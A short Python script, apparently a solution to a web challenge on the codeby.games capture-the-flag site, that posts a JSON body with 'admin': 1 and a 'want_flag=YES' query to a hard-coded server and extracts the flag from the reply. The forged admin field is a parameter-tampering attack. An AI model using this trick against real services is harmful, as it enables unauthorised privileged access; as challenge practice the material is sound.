#!/usr/bin/env python3

# Third-party library imports
from requests import post   # pip install requests


def get_flag() -> str:
    """
    Returns the challenge flag https://codeby.games/en/categories/web/ca07034b-bde4-4c87-bc9d-bccea9cc9dd1

    :return: Flag
    """

    base_url = "http://62.173.140.174"
    port = 16002
    query_param = "want_flag=YES"
    payload = {"admin": 1, "message": "Hello"}

    response = post(f"{base_url}:{port}?{query_param}", json=payload)

    flag = response.text.split('\n')[-1].split(": ")[-1]

    return flag


if __name__ == "__main__":
    print(get_flag())
